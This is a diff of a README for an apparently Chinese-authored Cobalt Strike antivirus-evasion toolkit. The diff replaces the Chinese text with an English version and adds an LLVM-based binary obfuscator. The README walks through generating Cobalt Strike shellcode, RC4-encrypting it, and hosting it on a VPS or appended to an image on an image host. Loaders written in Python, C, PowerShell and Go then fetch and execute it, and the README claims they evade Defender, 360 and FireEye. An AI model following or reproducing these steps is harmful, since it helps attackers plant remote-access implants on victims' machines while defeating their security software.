@@ -1,96 +1,135 @@
 # CS-Avoid-killing
-CS免杀,包括python版和C版本的(经测试Python打包的方式在win10上存在bug,无法运行,Win7测试无异常
+![Chinese README](https://github.com/Gality369/CS-Loader/blob/master/README.md)
 
-V1.0: 目前测试可以过Defender/火绒的静杀+动杀,360还没测= =不想装360全家桶了,可以自行测试
+Overall, malware identification through the application's binary feature strings is still the most commonly used static analysis by antivirus software, while dynamic analysis (sandboxing, virtual machines, etc.) can be bypassed by anti-debugging, anti-sandboxing, and other techniques, so minimizing the binary features of a malicious program is still an important means of avoiding detection and killing.
 
-下一步开发计划:
+CS evasion, including both Python and C versions (Tested: Python packaged version has bugs on Windows 10, not working, but works fine on Windows 7)
 
-V1.5: 加入C版本CS免杀(已完成)
+In addition to using a specific language to obfuscate binary features, it is also possible to implement a generic obfuscator to obfuscate arbitrary programs at the binary level. The generic obfuscator implemented in this project is an LLVM-17 based obfuscator that takes advantage of LLVM's new pass implementation plug-in feature to enable code obfuscation for multiple languages and platforms.
 
-V1.7:加入Powershell的免杀(已完成)
+- V4.0: A general-purpose code obfuscator has been implemented, which can obfuscate the binary of any program with the help of LLVM, and is theoretically a general-purpose method to fight against antivirus static scanning. The Generic_obfuscator is a rewrite of obfuscator ref: https://github.com/obfuscator-llvm/obfuscator
 
-~~V2.0:开发出UI界面~~
+- V3.1 Added Go version (can bypass FireEye/360/Defender).
 
-V2.0: 开发成在线免杀平台(已完成)
+- V3.0: Attempting to integrate more evasion techniques (planning to research process injection/file bundling to see how well they evade protection).
 
-> PS: 在实际使用中发现图形化界面不利于和其他工具结合,相比之下命令行的方式更具有扩展性
+- V2.0: Developed an online evasion platform (Completed)
+
+> PS: In practical use, I found that a graphical interface is not ideal for integration with other tools, while command-line interfaces are more flexible and extensible.
 > 
-> 关于自己写的在线免杀平台,暂不考虑开源,主要是觉得目前的技术还比较薄弱,如果有师傅想体验可以联系我
+> Regarding my online evasion platform, I don't plan to open-source it at this time because the technology is still in its early stages. If anyone is interested in trying it out, feel free to contact me.
 
-V3.0: 想办法结合更多免杀技术(想去研究下进程注入/文件捆绑,不知道免杀效果怎样)
+- ~~V2.0: Develop a graphical user interface~~
 
-- V3.1 增加了go版本(可过火绒/360/defender)
+- V1.7: Added PowerShell evasion (Completed)
 
-## 依赖环境
 
-python: 
+- V1.5: Added C version of CS evasion (Completed)
 
-- python2
-- pyinstaller
-- requests
+- V1.0: Currently, it can bypass Defender/FireEye's static and dynamic protection. 360 hasn't been tested yet. I don't want to install the full 360 suite, but you can test it yourself.
 
-C: VS2019默认就够了
+## Dependencies
 
-Powershell: Win10上测试没有问题,也就是ps5.1,更低版本未测试
+Generic Obfuscator:
 
-go: go
+- llvm-17：
+```
+git clone --depth 1 -b release/17.x https://github.com/llvm/llvm-project.git
+mkdir build
+cmake -G Ninja -DLLVM_ENABLE_PROJECTS="clang;lld" -DLLVM_TARGETS_TO_BUILD="X86;ARM;AArch64" -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF -DLLVM_ENABLE_RTTI=ON -DLLVM_OBFUSCATION_LINK_INTO_TOOLS=
+ON -DCMAKE_INSTALL_PREFIX=./build/ ../llvm-project/llvm
+ninja -j8
+ninja install
+```
 
-## 安装
+Python:
 
+- Python 2
+- PyInstaller
+- Requests
+
+C: VS2019 should be sufficient
+
+PowerShell: Tested on Windows 10 (PS 5.1), lower versions haven't been tested.
+
+Go: Go
+
+## Installation
+
+Other versions are portable to use, just clone the project.
 `git clone https://github.com/Gality369/CS-Avoid-killing.git`
 
-## 使用
+Howerver, Generic_bfuscator need additionally installation：
+```
+cd Generic Obfuscator
+mkdir build
+cd build
+cmake ..
+make -j `nproc`
+```
 
-1. 先通过CS生成C格式的shellcode:` Attacks -> packages -> Payload Generator `选择一个listener然后生成一个C的shellcode(其实就是二进制代码)
+## Usage
+1. First, generate a C-format shellcode through CS:
+`Attacks -> Packages -> Payload Generator`
+Choose a listener and generate a C shellcode (essentially binary code).
 
-2. Python版:
+2. Python version:
 
-   > 1. 将生成的shellcode填入generator.py的shellcode变量中,填入一个Key,用于后续的RC4加密
-   > 2. 运行generator.py,生成的payload自动保存在payload.txt中.
-   > 3. 将payload.txt上传到你的VPS中,后续生成的加载器会从VPS中获取加密shellcode并在本地解密后执行
-   > 4. 将在VPS上的payload路径填入PyLoader.py的url变量中,填入你刚刚设置的Key
-   > 5. 用`python pyinstaller.py -F -w PyLoader.py`打包文件,可执行文件在pyshellcode文件夹下的dist中,双击运行可以看到主机上线
+   > 1. Paste the generated shellcode into the shellcode variable in generator.py and provide a Key for RC4 encryption.
+   > 2. Run generator.py, the generated payload will be saved in payload.txt.
+   > 3. Upload payload.txt to your VPS. The loader will fetch the encrypted shellcode from the VPS and decrypt it locally for execution.
+   > 4. In PyLoader.py, fill in the path to the payload on your VPS and the Key you just set.
+   > 5. Package the file using `python pyinstaller.py -F -w PyLoader.py`. The executable will be in the dist folder inside the pyshellcode directory. Double-click to run and the host will go online.
 
-3. C版本:
+3. C version:
 
-   > 1. 按要求填入你自己的Key,shellcdoe长度和shellcode,执行
-   > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生成的加密shellcode保存在payload.txt文件中并将其放在服务器上(~~如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
-   > 在path中填入可以访问到payload的路径即可(Ex: /test/payload.txt)
-   > 3. 在Loader中填入自己的Key和VPS的IP,编译
-   > 4. 执行编译出的exe,CS上线
+   > 1. Input your own Key, shellcode length, and shellcode as required, then execute.
+   > 2. Copy the first line's number into the Base64ShellLen field in Loader, save the generated encrypted shellcode in payload.txt, and place it on the server. If the filename or path is different, modify the path in `char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";` accordingly.
+   > 3. In path, fill in the path to access the payload (e.g., /test/payload.txt).
+   > 4. Fill in your Key and VPS IP in Loader, then compile.
+   > 5. Run the compiled .exe to bring up the CS shell.
+
+4. PowerShell version:
+
+   > 1. Generate a PowerShell payload .ps1 in CS.
+   > 2. Run Python3 PSconfusion.py payload.ps1 AVpayload.ps1.
+   > 3. This version can bypass all static detections from current antivirus software. For dynamic detections, some CS modules may trigger detection when loading, and that will be explored further later.
+
+5. Go version:
+
+   > 1. Place a not-too-large image in the same folder.
+   > 2. Paste the generated shellcode into the shellcode variable in generator.py, and execute `python generator YourRC4key ImageName`. The shellcode will be appended to the end of the image.
+   > 3. Upload the image to an image hosting service (choose one that does not compress images to ensure the shellcode remains intact).
+  > 4. Enter the image URL and your RC4 key into the corresponding fields in CS-Loader.go.
+   > 5. Build the .exe using the command `go build -ldflags="-H windowsgui" CS-Loader.go` (you can compress it with UPX).
+   > 6. Run the .exe and the CS shell will be active.
+
+6. Generic Obfuscator Version：
    
-4. Powershell版本:
+   > 1. set `config/config.json` to enable different functions. (Please check `Generic_obfuscator/README.md` to get more information.)
+   > 2. run `<your-clang-17> -fpass-plugin=<your-generic_obfuscator.so>`
 
-   > 1. 在CS中生成Powershell版本的payload.ps1
-   > 2. Python3 PSconfusion.py payload.ps1 AVpayload.ps1
-   > 3. 经测试能过目前所有杀软的静杀,动杀的话,由于CS中有些模块不免杀,所以加载这些模块时可能会触发动杀,这个以后再研究怎么绕过
-   
-5. go版本:
+## Notes
 
-   > 1. 将一张不要太大的图片放入同一文件夹下
-   > 2. 将生成的shellcode填入generator.py的shellcode变量中, 执行`python generator YourRC4key ImageName` ,生成的shellcode会自动追加到图片末尾
-   > 3. 将图片上传至图床(找那种不会压缩的图床,保证shellcode不会被删掉)
-   > 4. 将图片url和你的RC4key填入CS-Loader.go的相应位置
-   > 5. 使用命令`go build -ldflags="-H windowsgui" CS-Loader.go`生成exe,可以用upx压缩下
-   > 6. 执行exe,CS上线
+1. PyInstaller Installation Details:
 
-## 注意
+   > The last version of PyInstaller that supports Python 2 is 3.6 (newer versions no longer support Python 2).
+   > 
+   > Website: https://github.com/pyinstaller/pyinstaller/releases
+   > 
+   > You also need to install pywin32: https://github.com/mhammond/pywin32
 
-1. pyinstaller安装细节
+2. Package in the target environment to avoid issues with different systems. Avoid using Python 3 for this project due to poor support for ctypes in Python 3, which can cause random bugs.
+   Thanks to KingSF5 for fixing the Python 3 version (greatly appreciated~).
 
-   > 最后一个支持python2的版本是3.6(最新版pyinstall不再支持python2)
-   >
-   > 网址:https://github.com/pyinstaller/pyinstaller/releases
-   >
-   > 需要安装pywin32:https://github.com/mhammond/pywin32
+3. C version testing:
+The C version works fine under X86Debug mode. In Release mode, there are unexplained bugs, and it may not work properly on some machines. Please test according to your needs.
 
-2. ~~目标是什么环境就在什么环境上打包,否则可能会出现无法上线的情况,不推荐使用py3对项目进行改造,ctypes对py3的支持不太好,会有些莫名其妙的bug~~
-    感谢KingSF5师傅对python3版本的修复(崇拜~)
+4. Do not select dynamic compilation, as it may cause the program to fail to run due to missing DLLs on the target machine.
 
-3. 经过测试,C版本在X86Debug模式编译下无任何问题,Release模式下会存在莫名bug,在某些电脑上无法正常上线,请根据需求自行测试
+5. The method of loading PowerShell scripts is not discussed here, but some experts have already documented it well. Please search for it on Baidu.
 
-4. 编译选项不要选择动态编译,否则可能会因为目标靶机上缺少相应dll而无法运行.
+6. Before building the Go version, it is recommended to run `set GOARCH=amd64` and use a 64-bit shellcode. A 32-bit build may lead to errors related to missing functions in ntdll.dll, as reported by others:
+https://stackoverflow.com/questions/58649055/failed-to-find-rtlcopymemory-procedure-in-ntdll-dll-only-when-goarch-386
 
-5. 加载ps脚本的方式这里不做讨论,有师傅已经总结的非常好了,请自行百度
-
-6. go版本build前建议先`set GOARCH=amd64`,同时使用64位的shellcode,32位打包出来的程序会报一个在ntdll中找不到函数的错误,曾有人提问过:https://stackoverflow.com/questions/58649055/failed-to-find-rtlcopymemory-procedure-in-ntdll-dll-only-when-goarch-386
+7. For a detailed description of Generic Obfuscator, please refer to `Generic_obfuscator/README.md`, which provides a detailed description of the obfuscator and how to use it.
